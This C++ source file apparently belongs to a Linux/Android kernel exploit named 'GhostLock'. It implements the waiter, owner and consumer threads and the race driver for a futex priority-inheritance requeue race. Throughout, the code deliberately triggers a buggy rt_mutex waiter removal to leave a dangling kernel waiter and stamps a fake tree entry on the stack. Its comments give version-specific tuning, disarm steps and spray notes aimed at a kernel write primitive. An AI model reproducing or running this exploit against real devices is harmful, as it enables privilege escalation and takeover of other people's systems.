/*
 * GhostLock — PI race worker threads and the per-write route entry.
 *
 * Split out of main.cpp; the statement order and log text are unchanged.
 */

#include "race/threads.hpp"

#include <cstdlib>
#include <cstring>

#include "attack/ops.hpp"
#include "profile/model.h"
#include "route/route_controller.h"
#include "route/route_policy.hpp"
#include "session/exploit_session.hpp"

using namespace ghostlock;

namespace ghostlock::race {
    void *waiter_thread(void *arg) {
        auto *race = static_cast<PiRace *>(arg);
        const memory::WriteRequest *request = race->request;
        support::disable_rseq_for_thread();
        int32_t tid = static_cast<int32_t>(syscall(SYS_gettid));
        race->waiter_tid.store(tid);
        if (support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0) != 0)
            pr_error("waiter lock chain errno=%d\n", errno);
        race->waiter_ready.store(1);
        while (!race->owner_started.load())
            usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
        struct timespec timeout;
        SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
        if (race->fast_repair.load()) {
            timeout.tv_nsec += 20000000L;
            if (timeout.tv_nsec >= 1000000000L) {
                timeout.tv_sec++;
                timeout.tv_nsec -= 1000000000L;
            }
        } else {
            uint64_t wait_ms = session::g_exploit_session.profile.race_route_wait_ms();
            if (const char *ov = getenv("GL_WAIT_MS"))
                wait_ms = strtoull(ov, nullptr, 10);
            uint64_t wait_ns = wait_ms * 1000000ULL;
            timeout.tv_sec += static_cast<time_t>(wait_ns / 1000000000ULL);
            timeout.tv_nsec += static_cast<long>(wait_ns % 1000000000ULL);
            if (timeout.tv_nsec >= 1000000000L) {
                timeout.tv_sec++;
                timeout.tv_nsec -= 1000000000L;
            }
        }
        pr_info("[dbg] waiter entering WAIT_REQUEUE_PI wait_futex=%d target_futex=%d\n", race->wait_futex, race->target_futex);
        if (const char *trap_env = getenv("GL_PRE_ARM")) {
            /* Raise our own nice first: the proxy waiter created by the
             * requeue inherits this (big) prio number, and after the requeue
             * returns the main thread lowers it again, so this thread's own
             * waiter enqueues with a smaller prio and becomes leftmost. */
            (void) support::sched_setattr_tid(tid, 19);
            unsigned char pre[0x200];
            memset(pre, 0, sizeof(pre));
            const unsigned long long trap = strtoull(trap_env, nullptr, 16);
            if (trap) {
                memcpy(pre + 0xe8 + 0x18, &trap, sizeof(trap));
            }
            pr_warning("pre-arm: trap=0x%llx -> pi_tree_entry\n", trap);
            if (!route::punch_stack_here(pre, sizeof(pre))) {
                pr_warning("pre-arm punch missed\n");
            }
            /* Nothing may syscall between the punch and the futex call. */
        }
        race->waiter_waiting.store(1);
        struct timespec wr0 {};
        SYSCHK(clock_gettime(CLOCK_MONOTONIC, &wr0));
        long wr_ret = support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                          &race->target_futex, 0);
        struct timespec wr1 {};
        SYSCHK(clock_gettime(CLOCK_MONOTONIC, &wr1));
        pr_info("[dbg] waiter WAIT_REQUEUE_PI returned ret=%ld errno=%d waited_ms=%lld\n",
                wr_ret, errno,
                static_cast<long long>((wr1.tv_sec - wr0.tv_sec) * 1000LL +
                                       (wr1.tv_nsec - wr0.tv_nsec) / 1000000L));
        route::RouteController controller;
        controller.init(race, &session::g_exploit_session.profile);
        race->route_status = controller.execute(request);
        if (controller.fallback_used) {
            pr_warning("TCP route cleanly failed; used Select Stack fallback\n");
        }
        if (route::route_needs_ghost_disarm(session::g_exploit_session.profile)) {
            /* remove_waiter() left this thread's pi_blocked_on pointing at the
         * reclaimed stack waiter. Force one final slow-path removal while the
         * stack frame is still alive, matching the 5.x multicast primitive's
         * disarm step. Without this, thread exit leaves a walkable dangling
         * ghost and the next mm_struct spray can panic the kernel. */
            uint32_t dummy_pi = 0x80000000U | static_cast<uint32_t>(getpid());
            struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
            errno = 0;
            long disarm = support::futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, nullptr, 0);
            pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
        }
        race->route_done.store(1);
        support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
        while (!race->owner_chain_done.load())
            usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
        return nullptr;
    }

    void *owner_thread(void *arg) {
        auto *race = static_cast<PiRace *>(arg);
        support::disable_rseq_for_thread();
        pr_info("[dbg] owner entering LOCK_PI target_futex=%d\n", race->target_futex);
        long lock_target = support::futex_op(
            &race->target_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
        pr_info("[dbg] owner LOCK_PI returned ret=%ld errno=%d\n", lock_target, errno);
        if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
        while (!race->waiter_ready.load() &&
               !race->owner_stop.load())
            usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
        if (race->owner_stop.load()) {
            if (lock_target == 0)
                support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
            return nullptr;
        }
        race->owner_started.store(1);
        /* REVERTED (HANDOFF 19): the 300 ms settle here was WRONG.  This thread
         * must already be PI-blocked on chain_futex (held by the waiter) when
         * the requeue is issued: that dependency is what makes
         * CMP_REQUEUE_PI fail with EDEADLK (35), which routes the requeue
         * through rt_mutex_start_proxy_lock()'s failure path and the buggy
         * remove_waiter() -- i.e. it is the ARM condition, not an error.  With
         * the settle the requeue returned 1 and nothing was ever armed. */
        if (getenv("GL_PRE_ARM")) {
            /* Pre-arm topology: this thread must NOT PI-block on chain_futex.
             * Without the cycle the requeue succeeds, the parked waiter is
             * woken and enqueues its OWN rt_mutex_waiter through
             * rt_mutex_wait_proxy_lock() -- that waiter sits in do_futex's
             * frame at depth 0x198, i.e. inside the sigret window. */
            race->owner_chain_done.store(1);
        } else if (const char *ct = getenv("GL_OWNER_CHAIN_TIMEOUT_MS")) {
            /* Diagnostic: keep the cycle alive across the requeue, then break it
             * on a timer so this thread can go on to release the target.  If the
             * requeue failed *after* task_blocks_on_rt_mutex() enqueued our
             * waiter, that release wakes it immediately (-EWOULDBLOCK); if the
             * waiter was never queued it can only time out. */
            struct timespec deadline;
            /* FUTEX_LOCK_PI interprets its absolute timeout against
             * CLOCK_REALTIME (unlike FUTEX_WAIT_REQUEUE_PI, which uses
             * CLOCK_MONOTONIC).  A monotonic deadline here is decades in the
             * past for the realtime clock, so the call returns ETIMEDOUT
             * immediately and the cycle never forms. */
            SYSCHK(clock_gettime(CLOCK_REALTIME, &deadline));
            const long long ms = strtoll(ct, nullptr, 10);
            deadline.tv_sec += static_cast<time_t>(ms / 1000);
            deadline.tv_nsec += static_cast<long>((ms % 1000) * 1000000L);
            if (deadline.tv_nsec >= 1000000000L) {
                deadline.tv_sec++;
                deadline.tv_nsec -= 1000000000L;
            }
            errno = 0;
            long chain_ret = support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0,
                                               &deadline, nullptr, 0);
            pr_warning("diag: owner chain lock ret=%ld errno=%d\n", chain_ret, errno);
            race->owner_chain_done.store(1);
        } else {
            support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
            race->owner_chain_done.store(1);
        }
        while (!race->owner_stop.load()) usleep(500);
        if (getenv("GL_UNLOCK_AFTER_FAIL"))
            pr_warning("owner: leaving loop, unlocking target now\n");
        if (lock_target == 0)
            support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
        return nullptr;
    }

    void *consumer_thread(void *arg) {
        auto *race = static_cast<PiRace *>(arg);
        support::disable_rseq_for_thread();
        kernel::pin_to_core(static_cast<size_t>(race->consumer_cpu));
        pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
        int32_t seen = 0;
        while (!race->consumer_stop.load()) {
            int32_t seq = race->consumer_go.load();
            if (seq == 0 || seq == seen) {
                __asm__ volatile (


                "yield"
                ::: "memory");
                continue;
            }
            seen = seq;
            int32_t tid = race->waiter_tid.load();
            int32_t calls_this_seq = 0;
            pr_info("[dbg] cons released seq=%d tid=%d\n", seq, tid);
            while (!race->consumer_stop.load() &&
                   race->consumer_go.load() == seq) {
                uint32_t delay_usec = race->route_delay_usec.load();
                if (delay_usec > 0) usleep(static_cast<useconds_t>(delay_usec));
                for (uint32_t burst = 0;
                     burst < session::g_exploit_session.profile.select_consumer_burst_calls(); burst++) {
                    if (race->consumer_stop.load() ||
                        race->consumer_go.load() != seq)
                        break;
                    race->consumer_calls.fetch_add(1);
                    if (calls_this_seq == 0)
                        support::progress_marker("consumer_go"); /* other thread: safe */
                    race->consumer_inflight.store(1);
                    errno = 0;
                    /* rotate the nice every call; (calls%19)+1 is what makes
                 * sched_setattr succeed on 6.1 compact */
                    int32_t consumer_nice = session::g_exploit_session.profile.has_compact_waiter()
                                            ? (calls_this_seq % 19) + 1
                                            : kernel::PSELECT_CONSUMER_NICE;
                    pr_info("[dbg] cons#%d nice=%d tid=%d -> sched_setattr\n",
                            calls_this_seq, consumer_nice, tid);
                    long sched_ret = support::sched_setattr_tid(tid, consumer_nice);
                    pr_info("[dbg] cons#%d raw sched_ret=%ld errno=%d\n",
                            calls_this_seq, sched_ret, errno);
                    if (sched_ret != 0) {
                        struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
                        long fret = support::futex_op(
                            &race->target_futex, FUTEX_LOCK_PI, 0, &ft, nullptr, 0);
                        if (fret == 0) {
                            support::futex_op(
                                &race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
                            sched_ret = 0;
                        }
                        pr_info("[dbg] cons#%d fallback fret=%ld errno=%d -> sched_ret=%ld\n",
                                calls_this_seq, fret, errno, sched_ret);
                    }
                    if (sched_ret == 0) race->consumer_success.fetch_add(1);
                    race->consumer_inflight.store(0);
                    pr_info("[dbg] cons#%d done success=%d calls=%d\n",
                            calls_this_seq, race->consumer_success.load(),
                            race->consumer_calls.load());
                    calls_this_seq++;
                    if (static_cast<uint32_t>(calls_this_seq) >=
                        session::g_exploit_session.profile.select_consumer_max_calls()) {
                        race->consumer_go.store(0);
                        break;
                    }
                }
            }
        }
        return nullptr;
    }

    void reset_main_route_state(void) {
        int32_t fast_repair = session::g_exploit_session.race.fast_repair.load();
        if (!session::g_exploit_session.race.reset(
            fast_repair ? 5000 : session::g_exploit_session.profile.select_enter_delay_us(),
            config::runtime_config_snapshot().main_cpu,
            config::runtime_config_snapshot().consumer_cpu)) {
            support::fail_stop_dirty_race("reset with live PI workers", EBUSY);
        }
        session::g_exploit_session.race.fast_repair.store(fast_repair);
    }
} // namespace ghostlock::race

/* Wait for the parked waiter/owner pair, trigger the PI requeue and return the
 * route outcome once the waiter reported completion. The count/timeout policy
 * lives in outcome_with_counters() and TODO(pi-timeout-01). */
ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
    while (!waiter_waiting.load() || !owner_started.load())
        usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
    pr_info("[route] waiter parked; owner started\n");
    if (getenv("GL_UNLOCK_AFTER_FAIL"))
        pr_warning("diag: settle_us=%u route_wait_ms=%u\n",
                   session::g_exploit_session.profile.race_setup_settle_us(),
                   session::g_exploit_session.profile.race_route_wait_ms());
    usleep(fast_repair.load()
               ? 5000
               : session::g_exploit_session.profile.race_setup_settle_us());
    pr_info("[dbg] requeue pre: *wait_futex=%u *target_futex=%u waiter_tid=%d\n",
            wait_futex, target_futex, waiter_tid.load());
    errno = 0;
    long rq = support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1,
                                reinterpret_cast<void *>(1),
                                &target_futex, 0);
    pr_info("[dbg] requeue try=0 ret=%ld errno=%d *wait_futex=%u *target_futex=%u\n",
            rq, errno, wait_futex, target_futex);
    /* success is ret >= 1 (one waiter requeued); only retry real errors */
    for (int32_t requeue_try = 1; rq < 0 && requeue_try <= 200; requeue_try++) {
        usleep(1000);
        errno = 0;
        rq = support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1,
                               reinterpret_cast<void *>(1),
                               &target_futex, 0);
        if (requeue_try <= 12 || (requeue_try % 50) == 0)
            pr_info("[dbg] requeue try=%d ret=%ld errno=%d *wait_futex=%u *target_futex=%u\n",
                    requeue_try, rq, errno, wait_futex, target_futex);
    }
    pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
            rq, errno);
    if (rq < 0 && getenv("GL_UNLOCK_AFTER_FAIL")) {
        /* Decisive A/B for the 4.19 arm: if rt_mutex_start_proxy_lock() got as
         * far as task_blocks_on_rt_mutex(), our waiter sits in the target
         * lock's waiter tree and this unlock wakes it immediately, so its
         * WAIT_REQUEUE_PI returns -EWOULDBLOCK (11) in a few ms.  If the
         * -EDEADLK came from the earlier owner==task check, the waiter was
         * never queued and it can only return after the full timeout (110). */
        pr_warning("diag: release target right after the failed requeue\n");
        owner_stop.store(1);
    }
    if (getenv("GL_PRE_ARM")) {
        /* Shrink the waiter's prio number while it is being woken, so its own
         * rt_mutex_waiter lands leftmost in the target lock's tree (the proxy
         * waiter was enqueued above with the old, larger prio number). */
        const int32_t wtid = waiter_tid.load();
        /* 1) Drop the prio number as the very first thing after the requeue
         *    returns.  The proxy waiter was enqueued above with the raised
         *    (nice 19) prio; if this lands before the woken waiter reaches
         *    rt_mutex_wait_proxy_lock(), its own rt_mutex_waiter carries a
         *    smaller prio and becomes the lock's leftmost waiter -- which is
         *    what makes rt_mutex_dequeue_pi() pick OUR stamped node. */
        (void) support::sched_setattr_tid(wtid, 0);
        /* 2) Give the woken waiter time to reach rt_mutex_wait_proxy_lock()
         *    and park with pi_blocked_on set. */
        usleep(500);
        /* 3) Hammer from this thread: every nice change makes
         *    __sched_setscheduler() call rt_mutex_adjust_prio_chain() on the
         *    parked task, i.e. on the waiter we stamped.  Once the wait times
         *    out rt_mutex_cleanup_proxy_lock() clears pi_blocked_on, so this
         *    window is the only one that matters. */
        pr_warning("pre-arm: hammering sched_setattr for the block window\n");
        for (int32_t i = 0; i < 4000; i++) {
            (void) support::sched_setattr_tid(wtid, (i % 19) + 1);
            (void) support::sched_setattr_tid(wtid, 0);
        }
        pr_warning("pre-arm: hammer done\n");
    }
    /* TODO(pi-timeout-01): This wait has no deadline. A route that stalls in
     * the race window (observed when the Shizuku log pipe applied
     * backpressure) parks the process forever and the corrupted PI chain is
     * never disarmed. Bound the wait from profile::TargetProfile.execution and map a
     * timeout to ROUTE_DIRTY_FAILURE instead of looping indefinitely. */
    struct timespec wait_started{};
    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &wait_started));
    const double timeout_ms = static_cast<double>(
        session::g_exploit_session.profile.race_route_done_timeout_ms());
    while (!route_done.load()) {
        if (runtime_time::runtime_elapsed_ms(&wait_started) >= timeout_ms) {
            return route::RouteStatus{
                .code = route::ROUTE_DIRTY_FAILURE,
                .step = 21,
                .error_number = ETIMEDOUT,
            };
        }
        usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
    }
    const route::RouteStatus status = route_status;
    const int32_t calls = consumer_calls.load();
    const int32_t success = consumer_success.load();
    pr_info("[route] route_done status=%d clean=%d/%d step=%d errno=%d "
            "calls=%d success=%d\n", status.code, status.userspace_clean,
            status.kernel_disarmed, status.step, status.error_number,
            calls, success);
    return outcome_with_counters(status, calls, success);
}

namespace ghostlock::race {
    /* Create, synchronize, stop and join one explicitly owned PI race. */
    Status run_main_route_threads(const memory::WriteRequest &request) {
        reset_main_route_state();
        pr_info("[route] creating waiter/owner/consumer\n");
        int32_t error = session::g_exploit_session.race.start_threads(
            waiter_thread, owner_thread, consumer_thread, &request);
        pr_info("[route] threads started error=%d\n", error);
        if (error) {
            if (session::g_exploit_session.race.route_status.code ==
                route::ROUTE_DIRTY_FAILURE) {
                support::fail_stop_dirty_race(
                    "partial PI worker startup cleanup", error);
            }
            session::g_exploit_session.race.route_status = route::RouteStatus{
                .code = route::ROUTE_DIRTY_FAILURE,
                .step = 20,
                .error_number = error,
            };
            pr_warning("PI race thread creation failed errno=%d\n", error);
            return 0;
        }
        pr_info("[dbg] race.run enter\n");
        route::RouteStatus status = session::g_exploit_session.race.run();
        pr_info("[dbg] race.run done code=%d step=%d errno=%d\n", status.code, status.step, status.error_number);
        if (status.code == route::ROUTE_DIRTY_FAILURE) {
            support::fail_stop_dirty_race("route_done deadline", status.error_number);
        }
        session::g_exploit_session.race.request_stop();
        const int32_t join_error = session::g_exploit_session.race.join();
        if (join_error != 0) {
            support::fail_stop_dirty_race("PI worker join", join_error);
        }
        pr_info("[route] threads joined\n");
        return status.code == route::ROUTE_OK;
    }
} // namespace ghostlock::race
